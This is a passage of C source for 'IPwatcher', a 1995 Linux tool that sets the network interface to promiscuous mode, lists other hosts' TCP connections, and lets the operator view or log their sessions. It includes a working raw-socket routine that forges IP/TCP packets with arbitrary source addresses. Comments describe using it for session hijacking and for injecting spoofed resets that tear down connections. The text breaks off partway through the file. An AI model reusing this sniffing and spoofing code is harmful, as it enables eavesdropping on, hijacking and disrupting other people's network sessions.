/* Linux IPwatcher Source
 * Deathstar[SM] 1995
 */
#include <sys/shm.h>
#include <sys/sem.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <termios.h>


/* Struct rawdata
 * This is the structure that contains the headers and packet
 * data for all packets recieved.
 */
struct rawdata
{
 struct ethhdr ethdata;
 struct iphdr ipdata;
 struct tcphdr tcpdata;
 char packetdata[8192];
};


/* Struct netaddr
 * This is the netmask structure, containing the netmask and
 * specifications of whether the netmask is active or not
 * active.
 */
struct netaddr
{
 long net[2][4];
 int active;
 int init;
};


/* Struct p_config
 * This is the program configuration structure, it contains
 * all options used in the program
 */
struct p_config {
 int inputtype;
 int traffictype;
 int hijacktype;
 int firedaemon;
};
   

/* Struct connode
 * This is the active connection structure.  If contains the
 * source/dest address's, ports, and a few other things.
 */
struct connode {
 unsigned long local;
 unsigned long remote;
 int lport;
 int rport;
 int connectnum;
 int active;
};


/* Struct conlist
 * This is the global shared-memory data structure.  It contains
 * every global shared option used in the program, including the
 * list of active connections, firewalls, the configuration, and
 * various other needed data.
 */
struct conlist {
    struct connode connnode[200];
    struct netaddr addrlist[200];
    struct p_config netconfig;
    int totalconnects;
    int totalfirewalls;
    int shutdown;
    int ethersock;
    int sessionsock;
    int outputsock;
    struct connode viewable;
    int viewactive;
};


/* These are the defines for the size of the headers, and the offsets. */
#define PACKETSIZE ( sizeof(struct iphdr) + sizeof(struct tcphdr)  )
#define offsetTCP  ( sizeof(struct iphdr) )
#define offsetIP   ( sizeof( struct iphdr ) + sizeof(struct tcphdr) + 5 )


int listptr,semlockptr;
struct sembuf *semlockbuf;
struct termios saved_attributes;
struct conlist *share_data;


u_short cksum( u_short *buf, int nwords );
unsigned short tcp_check(struct tcphdr *th, int len, unsigned long saddr, unsigned long daddr);
int check_firewall(long local, long remote);
int print_connections(void);
int in_list(long local,long remote,int lport,int rport);
int get_ch(char *ch);
int get_masks(struct netaddr *address, char *addr, int select);
int reset_connects(void);
int firewall_menu(void);
int config_menu(void);
int set_netmask(int netmode);
int delete_netmask(void);
int get_connects(void);
void save_config(void);
void add_netmask(void);
void play_connect(void);
void view_connect(int connectnum);
void log_connect(int connectnum);
void sem_wait(int locknum,int perm);
void get_deftty(void);
void reset_tty(void);
void set_tty(int echo);
void save_netmask(void);
void load_netmask(void);
void startether(void);
void upause(void);
void print_raw(char *rawdata,int length);
void print_rawfile(FILE *fileptr,long tdelay,char *rawdata,int length);
void del_firewall(int firenum);
void del_node(unsigned long local,unsigned long remote,int lport,int rport);
void add_node(unsigned long local,unsigned long remote,int lport,int rport);
void send_packet( long local,int fromport,long remote, int toport, ulong sequence, \
                  u_char theflag, ulong acknum,char * packdata, int datalen );


/* Void sem_wait()
 * This controls the semaphore operations, making sure that all shared
 * memory operations will always succeed when run.
 * 0: Read, -1: Write, 1: Reset write
 */
void sem_wait(int locknum,int perm)
{
        /*Set semaphore command*/
    semlockbuf->sem_op=(short)perm;
        /*Call command*/
    semop(locknum,semlockbuf,0);
}


/* Int get_masks()
 * This function reads a numeric address from a character pointer,
 * and stores the data in a netaddr structure.  This is used to
 * setup the firewall netmasks.
 * Select 0: From hosts, Select 1: To hosts
 */
int get_masks(struct netaddr *address, char *addr, int select)
{
    char *tempaddr;
    int i=0,ii,count;

    tempaddr=(char *)malloc(200);
    for(count=0;count<4;count++) {
      ii=0;
      while((!(addr[i]=='.'))&&(!(addr[i]=='\0'))) {
          tempaddr[ii]=addr[i];
          ii++;
          i++;
      }
      i++;
      tempaddr[ii]='\0';
      sem_wait(semlockptr,-1);
      address->net[select][count]=atoi(tempaddr);
      sem_wait(semlockptr,1);
      bzero((char *)tempaddr,200);
    }
}


/* Void startether()
 * This function puts the ethernet interface into promiscuous mode,
 * and initializes the 3 sockets used in the program.  These are
 * the new connections socket, the session viewing socket, and the
 * session hijacking socket.
 */
void startether(void)
{
    struct ifreq ifdata;
    int ethsock=0;

        /* Get the new connections listening socket */
    if ((ethsock=socket(AF_INET,SOCK_PACKET,htons(0x0800)))<0) {
     perror("Socket error: ");
     exit(1);
	}
    sem_wait(semlockptr,-1);
    share_data->ethersock=ethsock;
    sem_wait(semlockptr,1);

        /* Get the session viewing listening socket*/
    if ((ethsock=socket(AF_INET,SOCK_PACKET,htons(0x0800)))<0) {
     perror("Socket error: ");
     exit(1);
	}
    sem_wait(semlockptr,-1);
    share_data->sessionsock=ethsock;
    sem_wait(semlockptr,1);

        /* Get the session hijacking socket */
    ethsock=socket( AF_INET, SOCK_RAW, 255 );
    if (ethsock == -1 ) {
       perror("Getting raw socket");
       exit(1);
    }
    sem_wait(semlockptr,-1);
    share_data->outputsock=ethsock;
    sem_wait(semlockptr,1);

        /* Set the ethernet interface into promisc mode */
    strcpy(ifdata.ifr_name,"eth0");
    if( ioctl(ethsock,SIOCGIFFLAGS,&ifdata)<0) {
     close(ethsock);
     perror("Check flags: ");
     exit(1);
	}
    if(share_data->netconfig.traffictype==1) {
      ifdata.ifr_flags |=IFF_PROMISC;
      if( ioctl(ethsock,SIOCSIFFLAGS,&ifdata)<0) {
        close(ethsock);
        perror("Promisc mode: ");
        exit(1);
      }
    }
}


/* Void reset_tty()
 * This function resets the users tty from raw data entry mode.
 * After executing this function the tty is in line buffered mode.
 */
void reset_tty(void)
{
    tcsetattr (STDIN_FILENO, TCSANOW, &saved_attributes);
}


/* u_short cksum()
 * This function computes the checksum for the ip header of all
 * the spoofed packets made.
 */
u_short cksum( u_short *buf, int nwords )
{
        unsigned long sum;

        for ( sum = 0; nwords > 0; nwords -- )
                sum += *buf++;
        sum = ( sum >> 16) + ( sum & 0xffff );
        sum += ( sum >> 16 );
        return ~sum ;
}


/* Void fill_sockhost()
 * This function stores the host address into the sockaddr pointer.
 * The sockaddr pointer is needed for the sendto() function to spoof
 * packets.
 */
void fill_sockhost(struct sockaddr_in *addr, char *hostname)
{
    struct  sockaddr_in *address;

    address = (struct sockaddr_in *)addr;
    (void) bzero( (char *)address, sizeof(struct sockaddr_in) );
    address->sin_family = AF_INET;
    address->sin_addr.s_addr = inet_addr(hostname);
}


/* Void fill_sockport()
 * This function stores the destination port number in the sockaddr
 * structure, used with the sendto() function to spoof packets
 */
void fill_sockport(struct sockaddr_in * addr, u_short port)
{
    addr->sin_port = htons(port);
}


/* Void send_packet()
 * This function does the actual packet spoofing, for the firewalls
 * and session hijacking.  It needs numerous variables, including
 * source and destination hosts and ports, the sequence and ack
 * numbers, the tcp packet type flag, the data to send, and the
 * ammount of data to send.  The socket to use is gotten from the
 * configuration information in the share_data structure.
 */
void send_packet( long local,int fromport,long remote, int toport, ulong sequence, \
                  u_char theflag, ulong acknum,char * packdata, int datalen )
{
    char *packet;
    char *crap;
    int sock;
    int result;
    int tempint;
    struct tcphdr * fake_tcp;
    struct iphdr * real_ip;
    struct sockaddr_in remhost;

    sem_wait(semlockptr,0);
    sock=share_data->outputsock;
    fill_sockhost((struct sockaddr *)&remhost,inet_ntoa(remote));
    fill_sockport((struct sockaddr *)&remhost,toport);

        /* Malloc space for the packet */
    packet = (char *)malloc( PACKETSIZE + datalen);
    if ( !packet ) {
        perror("Getting space for packet");
        exit(-1);
    }
    tempint=toport;
    toport=fromport;
    fromport=tempint;

        /* Fill in the tcp header */
    fake_tcp = ( struct tcphdr *)( packet + offsetTCP );
    fake_tcp->th_dport = htons(fromport);
    fake_tcp->th_sport = htons(toport);
    fake_tcp->th_flags = theflag;
    fake_tcp->th_seq     = htonl(sequence);
    fake_tcp->th_ack     = htonl(acknum);
    fake_tcp->th_off     = (sizeof(struct tcphdr))/4;
    fake_tcp->th_win  = 2;

        /* Fill in the packet data */
    if (datalen>0) {
       crap = ( char * ) ( packet + offsetTCP + sizeof(struct tcphdr) );
       for(tempint=0;tempint<datalen;tempint++) {
         *crap=*packdata;
         *crap++;
         *packdata++;
       }
    }

        /* Fill in the IP header */
    real_ip = ( struct iphdr *)packet;
    real_ip->version = 4;
    real_ip->ihl = 5;
    real_ip->tot_len = htons(PACKETSIZE+datalen);
    real_ip->tos = 0;
    real_ip->ttl = 64;
    real_ip->protocol = 6;
    real_ip->check = 0;
    real_ip->id = 10786;
    real_ip->frag_off = 0;
    real_ip->daddr = htonl( remote );
    real_ip->saddr = htonl( local );
    real_ip->check = cksum( (u_short  *)packet, sizeof( struct iphdr) >> 1 );

        /* Fill in TCP checksum */
    fake_tcp = ( struct tcphdr * )(packet + offsetTCP );
    fake_tcp->th_sum=0;
    fake_tcp->th_sum=tcp_check(fake_tcp,sizeof(struct tcphdr)+datalen, \
         real_ip->saddr, real_ip->daddr);

        /* Send the packet */
    result = sendto( sock, packet, PACKETSIZE+datalen, 0,(struct sockaddr *)&remhost, sizeof( remhost ) );

        /* Check for errors */
    if ( result != PACKETSIZE+datalen ) {
			perror("sending packet" ); 
    }
    free(packet);
}


/* Unsigned short tcp_check()
 * This function computes the tcp checksum for the tcp header for all
 * packets spoofed.
 */
unsigned short tcp_check(struct tcphdr *th, int len, unsigned long saddr, unsigned long daddr)
{     
	unsigned long sum;
	__asm__("
	    addl %%ecx, %%ebx
	    adcl %%edx, %%ebx
	    adcl $0, %%ebx
	    "
	: "=b"(sum)
	: "0"(daddr), "c"(saddr), "d"((ntohs(len) << 16) + IPPROTO_TCP*256)
	: "bx", "cx", "dx" );
	__asm__("
	    movl %%ecx, %%edx
	    cld
	    cmpl $32, %%ecx
	    jb 2f
	    shrl $5, %%ecx
	    clc
1:	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    lodsl
	    adcl %%eax, %%ebx
	    loop 1b
	    adcl $0, %%ebx
	    movl %%edx, %%ecx
2:	    andl $28, %%ecx
	    je 4f
	    shrl $2, %%ecx
	    clc
3:	    lodsl
	    adcl %%eax, %%ebx
	    loop 3b
	    adcl $0, %%ebx
4:	    movl $0, %%eax
	    testw $2, %%dx
	    je 5f
	    lodsw
	    addl %%eax, %%ebx
	    adcl $0, %%ebx
	    movw $0, %%ax
5:	    test $1, %%edx
	    je 6f
	    lodsb
	    addl %%eax, %%ebx
	    adcl $0, %%ebx
6:	    movl %%ebx, %%eax
	    shrl $16, %%eax
	    addw %%ax, %%bx
	    adcw $0, %%bx
	    "
	: "=b"(sum)
	: "0"(sum), "c"(len), "S"(th)
	: "ax", "bx", "cx", "dx", "si" );
  	return((~sum) & 0xffff);
}


/* Void get_deftty()
 * This function gets the default values on the user tty so they can
 * later be restored.
 */
void get_deftty(void)
{
         /* Save the terminal attributes so we can restore them later.  */
    tcgetattr (STDIN_FILENO, &saved_attributes);
}

/* Void set_tty()
 * This function sets the tty of the user, putting it into raw mode
 * so individual keystrokes can be gotten.
 */
void set_tty(int echo)
{
    struct termios tattr;
    char *name;

    /* Make sure stdin is a terminal.  */
    if (!isatty (STDIN_FILENO))
      {
        fprintf (stderr, "Not a terminal.\n");
        exit (EXIT_FAILURE);
      }
         /* Set the funny terminal modes.  */
    tcgetattr (STDIN_FILENO, &tattr);
    tattr.c_lflag &= ~(ICANON);
    tattr.c_cc[VMIN] = 1;
    if(echo==0) tattr.c_lflag &= ~(ECHO);
    else tattr.c_lflag |= ECHO;
    tcsetattr (STDIN_FILENO, TCSAFLUSH, &tattr);
}


/* Int get_ch()
 * This function reads a single character from the tty. It returns
 * a 1 if a character was read.
 */
int get_ch(char *ch)        /* read a character from stdin w/o buffering */
{ 
  static int stdi;
  static int init = 1;
  if(init)
    {
      stdi = open("/dev/tty",O_RDWR | O_NDELAY); /* dont wait if no waiting */
      init = 0;
    }
  return read(stdi,ch,sizeof(char));
}


/* Int print_connections()
 * This function is called when option 2 'view connections' is
 * chosen from the main menu.  If its in the 'file' input type
 * mode, it will automatically call the play_connect function.
 * Otherwise, it will show a list of all active connections on
 * the ethernet, letting the user choose which one to view.
 * Then the user is asked whether he wants to view the session
 * or view the session while logging it to a file.
 */
int print_connections(void)
{
    int numlines=0,cmdnum,i=0,ethernet;
    char *usercmd;

        /* Check if in file playback mode */
    sem_wait(semlockptr,0);
    if(share_data->netconfig.inputtype==0) {
      play_connect();
    }

    else {
        /* Malloc user command space */
      usercmd=(char *)malloc(200);

        /* Check for active connections */
      sem_wait(semlockptr,0);
      ethernet=share_data->ethersock;
      if((share_data->connnode[0].active==0)) {
          printf("No active connections.\n\n");
          upause();
          return -1;
      }

        /* Connections found */
      fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
      sem_wait(semlockptr,0);
      while(!(share_data->connnode[i].active==0)) {

                /* Print connection */
             printf("[%d] %s Port %d to: ",i+1,inet_ntoa(share_data->connnode[i].local),ntohs(share_data->connnode[i].lport));
             printf("%s Port %d\n",inet_ntoa(share_data->connnode[i].remote),ntohs(share_data->connnode[i].rport));
             i++;
             numlines++;

                /* Stop at end of page */
             if(numlines>21) {
                printf("[<More Connections> NS for next screen. Q to quit]\n");
                for(;;) {

                        /* Read command */
                   printf("Command or connection number: ");
                   scanf("%s",usercmd);
                   if(!strcasecmp(usercmd,"ns")) {
		numlines=0;
             printf("[%d] %s Port %d to: ",i+1,inet_ntoa(share_data->connnode[i].local),ntohs(share_data->connnode[i].lport));
             printf("%s Port %d\n",inet_ntoa(share_data->connnode[i].remote),ntohs(share_data->connnode[i].rport));
             i++;
                 printf("Active connection list.\n");
                       break;
                   }
                   else if(!strcasecmp(usercmd,"q")) {
                       return(0); }
                   else {
                       cmdnum=atoi(usercmd);
                       sem_wait(semlockptr,-1);
                       if((cmdnum>0)&&(cmdnum<=(share_data->totalconnects+1))) {
                          share_data->viewable.local=share_data->connnode[cmdnum-1].local;
                          share_data->viewable.lport=share_data->connnode[cmdnum-1].lport;
                          share_data->viewable.rport=share_data->connnode[cmdnum-1].rport;
                          share_data->viewable.remote=share_data->connnode[cmdnum-1].remote;
                          share_data->viewactive=1;
                          sem_wait(semlockptr,1);
                          for(;;) {

                                /* Select if logging */
                            printf("View type [s]creen or [f]ile: ");
                            scanf("%s",usercmd);
                            if(!strcasecmp(usercmd,"s")) {
                              view_connect(cmdnum-1);
                              return(0);
                            }
                            if(!strcasecmp(usercmd,"f")) {
                              log_connect(cmdnum-1);
                              return(0);
                            }
                          }
                       }
                       else printf("<Invalid Command> ");
                       sem_wait(semlockptr,1);
                   }
                }
             }
      }
      printf("[<No More Connections> Q to quit]\n");
      for(;;) {

            /* Read command */
         printf("Command or connection number: ");
         scanf("%s",usercmd);
         if(!strcasecmp(usercmd,"q")) {
             return(0); }
         else {
             cmdnum=atoi(usercmd);
             sem_wait(semlockptr,-1);
             if((cmdnum>0)&&(cmdnum<=(share_data->totalconnects+1))) {
                share_data->viewable.local=share_data->connnode[cmdnum-1].local;
                share_data->viewable.lport=share_data->connnode[cmdnum-1].lport;
                share_data->viewable.rport=share_data->connnode[cmdnum-1].rport;
                share_data->viewable.remote=share_data->connnode[cmdnum-1].remote;
                share_data->viewactive=1;
                sem_wait(semlockptr,1);
                for(;;) {

                    /* Select if logging */
                  printf("View type [s]creen or [f]ile: ");
                  scanf("%s",usercmd);
                  if(!strcasecmp(usercmd,"s")) {
                    view_connect(cmdnum-1);
                    return(0);
                  }
                  if(!strcasecmp(usercmd,"f")) {
                    log_connect(cmdnum-1);
                    return(0);
                  }
                }
                return(0);
             }
             else printf("<Invalid Command> ");
             sem_wait(semlockptr,1);
         }
         sem_wait(semlockptr,0);
      }
      return(0);
    }
}


/* Void del_node()
 * This function runs through the list of active connections, trying
 * to find the connection specified.  If found, it will delete that
 * connection from the list, and update the rest of the list.
 */
void del_node(unsigned long local,unsigned long remote,int lport,int rport)
{
    int i=0,found=0;

    sem_wait(semlockptr,0);

        /* Run through list of connects */
    while(i<=share_data->totalconnects) {
            /* Check for match*/
        if(((share_data->connnode[i].lport==rport)&&(share_data->connnode[i].rport==lport))) {
          if(((share_data->connnode[i].local==remote)&&(share_data->connnode[i].remote==local))) {
            found=1;
            break;
          }
        }
            /* Check for match */
        else if(((share_data->connnode[i].lport==lport)&&(share_data->connnode[i].rport==rport))) {
          if(((share_data->connnode[i].local==local)&&(share_data->connnode[i].remote==remote))) {
            found=1;
            break;
          }
        }
      i++;
    }

        /* If match found */
    if(found) {

            /* Check if were viewing this connection */
        sem_wait(semlockptr,-1);
        if(share_data->viewactive) {
         if(share_data->viewable.local==share_data->connnode[i].local)
          if(share_data->viewable.remote==share_data->connnode[i].remote)
           if(share_data->viewable.lport==share_data->connnode[i].lport)
            if(share_data->viewable.rport==share_data->connnode[i].rport)
             share_data->viewactive=-1;

             /* Check if viewing in reverse order */
         else if(share_data->viewable.local==share_data->connnode[i].remote)
          if(share_data->viewable.remote==share_data->connnode[i].local)
           if(share_data->viewable.lport==share_data->connnode[i].rport)
            if(share_data->viewable.rport==share_data->connnode[i].lport)
             share_data->viewactive=-1;
        }

            /* Fix rest of the list */
        while(i<=share_data->totalconnects) {
           share_data->connnode[i].local=share_data->connnode[i+1].local;
           share_data->connnode[i].remote=share_data->connnode[i+1].remote;
           share_data->connnode[i].lport=share_data->connnode[i+1].lport;
           share_data->connnode[i].rport=share_data->connnode[i+1].rport;
           share_data->connnode[i].active=share_data->connnode[i+1].active;
           i++;
        }

            /* Decrement total connect counter */
        share_data->totalconnects--;
        sem_wait(semlockptr,1);
    }
}


/* Void add_node()
 * This function scans to the end of the list of active connections,
 * and adds a new connection to the list.
 */
void add_node(unsigned long local,unsigned long remote,int lport,int rport)
{
    int tmpint=0,i=0;

    sem_wait(semlockptr,-1);

        /* Advance to the end of the list */
    while(!(share_data->connnode[i].active==0)) {
      i++;
    }

        /* Add node to end of list */
    share_data->connnode[i].local=remote;
    share_data->connnode[i].remote=local;
    share_data->connnode[i].lport=rport;
    share_data->connnode[i].rport=lport;
    share_data->connnode[i].active=1;
    share_data->connnode[i+1].active=0;

        /* Update total connect counter */
    share_data->totalconnects=i;
    sem_wait(semlockptr,1);
}


/* Int get_connects()
 * This is the background process that constantly listens to the
 * ethernet for new connections.  If a new connection is found
 * and the firewall daemon is active, it calls the check_firewall()
 * function to see if the connection should be denied.  If it
 * is firewalled, TCP resets are spoofed to both ends of the
 * connections.  Otherwise, the connection is added to the list
 * of active connections.  This function also listens for closed
 * connections, and deletes them from the list of actives.
 */
int get_connects(void)
{
    struct rawdata rawether;
    struct iphdr *eth_ip;
    struct tcphdr *eth_tcp;
	struct timeval timeout;
    struct sockaddr sockdata;
	fd_set rd,wr;
    int dlen=0;
    int numfound=0,ethernet;

    sem_wait(semlockptr,0);
    ethernet=share_data->ethersock;

        /* Start packet recieving loop */
    for(;;)
	{
        sem_wait(semlockptr,0);
        if(share_data->shutdown) break;
        bzero(&sockdata,sizeof(sockdata));
        FD_ZERO(&rd);
		FD_ZERO(&wr);
        FD_SET(ethernet,&rd);
		timeout.tv_sec=0;
		timeout.tv_usec=0;
        eth_ip=(struct iphdr *)(((unsigned long)&rawether.ipdata)-2);
        eth_tcp=(struct tcphdr *)(((unsigned long)&rawether.tcpdata)-2);
        if(FD_ISSET(ethernet,&rd))
			{

                /* Recieve a new packet */
            recvfrom(ethernet,&rawether,sizeof(rawether),0,&sockdata,&dlen);
			}
        if(rawether.ethdata.h_proto==ntohs(ETH_P_IP))
		{
          if(eth_ip->protocol==6) {

                /* Check for new connection? */
            if(eth_tcp->th_flags==(TH_ACK|TH_SYN)) {
              sem_wait(semlockptr,0);
              if(share_data->netconfig.firedaemon==1) {

                    /* Refuse connect.  Its firewalled */
                if (check_firewall(eth_ip->saddr,eth_ip->daddr)) {
                  send_packet( ntohl(eth_ip->saddr),ntohs(eth_tcp->th_sport),ntohl(eth_ip->daddr),ntohs(eth_tcp->th_dport), \
                               ntohl(eth_tcp->th_seq)+1,TH_RST,ntohl(eth_tcp->th_ack),NULL,0);
                  send_packet( ntohl(eth_ip->daddr),ntohs(eth_tcp->th_dport),ntohl(eth_ip->saddr),ntohs(eth_tcp->th_sport), \
                               ntohl(eth_tcp->th_ack),TH_RST,ntohl(eth_tcp->th_seq),NULL,0);
                }
              }

                    /* Add new connect to list */
	      if (!((eth_tcp->th_sport==ntohs(80)) || 
			(eth_tcp->th_dport==ntohs(80))))
              add_node(eth_ip->saddr,eth_ip->daddr,eth_tcp->th_sport,eth_tcp->th_dport);
            }

                /* Check for end connects */
            else if(eth_tcp->th_flags & (TH_FIN)) {
              del_node(eth_ip->saddr,eth_ip->daddr,eth_tcp->th_sport,eth_tcp->th_dport);
            }
            else if(eth_tcp->th_flags & (TH_RST)) {
              del_node(eth_ip->saddr,eth_ip->daddr,eth_tcp->th_sport,eth_tcp->th_dport);
            }
          }
		}
	}
    exit(0);
}


/* Void add_netmask()
 * This function scans to the end of the netmask list, and adds a new
 * netmask to the list.  These netmasks are used in the firewall
 * routines.
 */
void add_netmask(void)
{
    char *netadd,*checkadd;
    int curmask=0,i=0;
    long tempadd=0;

    netadd=(char *)malloc(100);
    checkadd=(char *)malloc(100);
    sem_wait(semlockptr,0);

        /* Go to end of list */
    while(!(share_data->addrlist[i].init==0)) {
        i++;
    }
    sem_wait(semlockptr,-1);
    share_data->addrlist[i].active=0;
    share_data->addrlist[i].init=1;
    sem_wait(semlockptr,1);
    printf("Adding firewall number %d.\n",i+1);
    printf("Enter address/netmask to control access to.\n");

        /* Get first address */
    for(;;) {
       printf("Address> ");
       scanf("%s",netadd);
       tempadd = inet_addr(netadd);
       if (!((int)tempadd==-1)) {
          printf("Is this correct? y/n: ");
          scanf("%s",checkadd);
          if((checkadd[0]=='y')||(checkadd[0]=='Y')) {
            get_masks(&share_data->addrlist[i],netadd,0);
            break;
          }
       }
    }
    printf("Enter address/netmask to block access from.\n");

        /* Get second address */
    for(;;) {
       printf("Address> ");
       scanf("%s",netadd);
       tempadd = inet_addr(netadd);
       if (!((int)tempadd==-1)) {
          printf("Is this correct? y/n: ");
          scanf("%s",checkadd);
          if((checkadd[0]=='y')||(checkadd[0]=='Y')) {
            get_masks(&share_data->addrlist[i],netadd,1);
            break;
          }
       }
    }

        /* Check for activation */
    for(;;) {
       printf("Activate this firewall now? y/n: ");
       scanf("%s",checkadd);
       if((checkadd[0]=='y')||(checkadd[0]=='Y')) {
         sem_wait(semlockptr,-1);
         share_data->addrlist[i].active=1;
         sem_wait(semlockptr,1);
         printf("Firewall activated.\n\n");
         break;
       }
       else {
         printf("Firewall not activated.\n\n");
         break;
       }
    }
    sem_wait(semlockptr,-1);
    share_data->addrlist[i+1].init=0;

        /* Update total firewall counter */
    share_data->totalfirewalls=i;
    sem_wait(semlockptr,1);
    upause();
}


/* Void del_firewall()
 * This function deletes a netmask from the list of active firewalls.
 */
void del_firewall(int firenum)
{
    sem_wait(semlockptr,-1);

        /* Decrement total firewall counter */
    share_data->totalfirewalls--;

        /* Fix rest of list */
    while(!(share_data->addrlist[firenum].init==0)) {
        share_data->addrlist[firenum].net[0][0]=share_data->addrlist[firenum+1].net[0][0];
        share_data->addrlist[firenum].net[0][1]=share_data->addrlist[firenum+1].net[0][1];
        share_data->addrlist[firenum].net[0][2]=share_data->addrlist[firenum+1].net[0][2];
        share_data->addrlist[firenum].net[0][3]=share_data->addrlist[firenum+1].net[0][3];
        share_data->addrlist[firenum].net[1][0]=share_data->addrlist[firenum+1].net[1][0];
        share_data->addrlist[firenum].net[1][1]=share_data->addrlist[firenum+1].net[1][1];
        share_data->addrlist[firenum].net[1][2]=share_data->addrlist[firenum+1].net[1][2];
        share_data->addrlist[firenum].net[1][3]=share_data->addrlist[firenum+1].net[1][3];
        share_data->addrlist[firenum].active=share_data->addrlist[firenum+1].active;
        share_data->addrlist[firenum].init=share_data->addrlist[firenum+1].init;
        firenum++;
    }
    sem_wait(semlockptr,1);
}


/* Int delete_netmask()
 * This function gives a list of netmasks in the active list, and
 * lets the user choose if they want to delete one.  If a netmask
 * is chosen, it calls the del_netmask() function, to remove it
 * from the list.
 */
int delete_netmask(void)
{
    char *usercmd;
    int i=0;
    int curmask=0,linecount=0,cmdnum;

    usercmd=(char *)malloc(100);
    sem_wait(semlockptr,0);

        /* Check if list is empty */
    if((share_data->addrlist[0].init==0)) {
        printf("No firewalls to delete.\n\n");
        upause();
        return(0);
    }
    fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
    printf("Netmask list.\n");
    sem_wait(semlockptr,0);

        /* Run through netmask list */
    while(!(share_data->addrlist[i].init==0)) {

            /* Print netmask */
        printf("[%d] Block access to %d.%d.%d.%d from %d.%d.%d.%d\n",i+1, \
               share_data->addrlist[i].net[0][0],share_data->addrlist[i].net[0][1], \
               share_data->addrlist[i].net[0][2],share_data->addrlist[i].net[0][3],share_data->addrlist[i].net[1][0], \
               share_data->addrlist[i].net[1][1],share_data->addrlist[i].net[1][2],share_data->addrlist[i].net[1][3]);
        linecount++;

            /* Pause for end of page */
        if(linecount>21) {
            linecount=0;
            printf("[<More Firewalls> NS for next screen. Q to quit]\n");

                /* Get command */
            for(;;) {
               printf("Command or firewall number: ");
               scanf("%s",usercmd);
               if(!strcasecmp(usercmd,"ns")) {
                   fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
                   printf("Netmask list.\n");
                   break;
               }
               else if(!strcasecmp(usercmd,"q")) {
                   return(0); }
               else {
                   cmdnum=atoi(usercmd);
                   sem_wait(semlockptr,0);
                   if((cmdnum>0)&&(cmdnum<=(share_data->totalfirewalls+1))) {

                        /* Delete firewall */
                     del_firewall(cmdnum-1);
                     printf("Firewall deleted.\n\n");
                     upause();
                     return(0);
                   }
                   else printf("<Invalid Command> ");
               }
            }
        }
        i++;
        sem_wait(semlockptr,0);
    }
    printf("[<No More Firewalls> Q to quit]\n");

        /* Get command */
    for(;;) {
       printf("Command or firewall number: ");
       scanf("%s",usercmd);
       if(!strcasecmp(usercmd,"q")) {
           return(0); }
       else {
           cmdnum=atoi(usercmd);
           sem_wait(semlockptr,0);
           if((cmdnum>0)&&(cmdnum<=(share_data->totalfirewalls+1))) {

                /* Delete firewall */
             del_firewall(cmdnum-1);
             printf("Firewall deleted.\n\n");
             upause();
             return(0);
           }
           else printf("<Invalid Command> ");
       }
    }
}


/* Int set_netmask()
 * This function gives the user a list of firewalls, and their status.
 * (active/nonactive).  The user can then turn individual firewalls
 * on and off.
 */
int set_netmask(int netmode)
{
    char *usercmd;
    int i=0;
    int curmask=0,linecount=0,cmdnum;

    usercmd=(char *)malloc(100);
    sem_wait(semlockptr,0);

        /* Check if list is empty */
    if((share_data->addrlist[0].init==0)) {
        printf("No firewalls to ");
        if(netmode==0) printf("activate.\n\n");
        else printf("deactivate.\n\n");
        upause();
        return(0);
    }
    fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
    printf("Netmask list.\n");
    sem_wait(semlockptr,0);

        /* Run throught netmask list */
    while(!(share_data->addrlist[i].init==0)) {

            /* Print netmask */
        printf("[%d] Block access to %d.%d.%d.%d from %d.%d.%d.%d ",i+1, \
               share_data->addrlist[i].net[0][0],share_data->addrlist[i].net[0][1], \
               share_data->addrlist[i].net[0][2],share_data->addrlist[i].net[0][3], \
               share_data->addrlist[i].net[1][0],share_data->addrlist[i].net[1][1], \
               share_data->addrlist[i].net[1][2],share_data->addrlist[i].net[1][3]);
        if(share_data->addrlist[i].active==1) printf("[Active]\n");
        else printf("[Not Active]\n");
        linecount++;

            /* Pause for end of page */
        if(linecount>21) {
            linecount=0;
            printf("[<More Firewalls> NS for next screen. Q to quit]\n");

                /* Get Command */
            for(;;) {
               printf("Command or firewall number: ");
               scanf("%s",usercmd);
               if(!strcasecmp(usercmd,"ns")) {
                   fprintf(stdout,"%c[H%c[;H%c[2J",(char)27,(char)27,(char)27);
                   printf("Netmask list.\n");
                   break;
               }
               else if(!strcasecmp(usercmd,"q")) {
                   return(0); }
               else {
                   cmdnum=atoi(usercmd);
                   sem_wait(semlockptr,0);
                   if((cmdnum>0)&&(cmdnum<=(share_data->totalfirewalls+1))) {

                        /* Activate firewall */
                     if(netmode==0) {
                        sem_wait(semlockptr,-1);
                        share_data->addrlist[cmdnum-1].active=1;
                        sem_wait(semlockptr,1);
                        printf("Firewall activated.\n\n");
                        upause();
                        return(0);
                     }

                        /* Deactivate firewall */
                     else {
                        sem_wait(semlockptr,-1);
                        share_data->addrlist[cmdnum-1].active=0;
                        sem_wait(semlockptr,1);
                        printf("Firewall deactivated.\n\n");
                        upause();
                        return(0);
                     }
                   }
                   else printf("<Invalid Command> ");
               }
            }
        }
        i++;
    }
    printf("[<No More Firewalls> Q to quit]\n");

        /* Get Command */
    for(;;) {
       printf("Command or firewall number: ");
       scanf("%s",usercmd);
       if(!strcasecmp(usercmd,"q")) {
           return(0); }
       else {
           cmdnum=atoi(usercmd);
           sem_wait(semlockptr,0);
           if((cmdnum>0)&&(cmdnum<=(share_data->totalfirewalls+1))) {

                /* Activate firewall */
             if(netmode==0) {
                sem_wait(semlockptr,-1);
                share_data->addrlist[cmdnum-1].active=1;
                sem_wait(semlockptr,1);
                printf("Firewall activated.\n\n");
                upause();
                return(0);
             }

                /* Deactivate firewall */
             else {
                sem_wait(semlockptr,-1);
                share_data->addrlist[cmdnum-1].active=0;
                sem_wait(semlockptr,1);
                printf("Firewall deactivated.\n\n");
                upause();
                return(0);
             }
           }
           else printf("<Invalid Command> ");
       }
    }
}


/* Void save_netmask()
